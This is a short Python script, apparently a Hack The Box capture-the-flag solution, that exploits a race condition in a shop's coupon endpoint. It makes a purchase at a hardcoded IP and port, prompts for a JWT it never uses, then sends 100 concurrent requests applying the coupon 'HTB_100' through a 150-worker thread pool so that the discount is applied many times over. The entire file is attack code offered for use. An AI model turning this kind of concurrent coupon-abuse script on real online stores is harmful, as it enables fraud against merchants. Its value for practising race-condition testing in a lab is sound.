from threading import Thread
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed


url ="http://167.99.202.193:31747/api/coupons/apply"
coupon = {"coupon_code": "HTB_100"}

url_pur ="http://167.99.202.193:31747/api/purchase"
item = {"item": "A3"}

r = requests.session()
s = r.post(url_pur, data=item)
print(s.cookies)

cook = input("Put your JWT: ")


def connect(URL):
    r = requests.post(URL, data=coupon)

with ThreadPoolExecutor(max_workers=150) as executor:
    for x in range(100):
        executor.submit(connect, url)
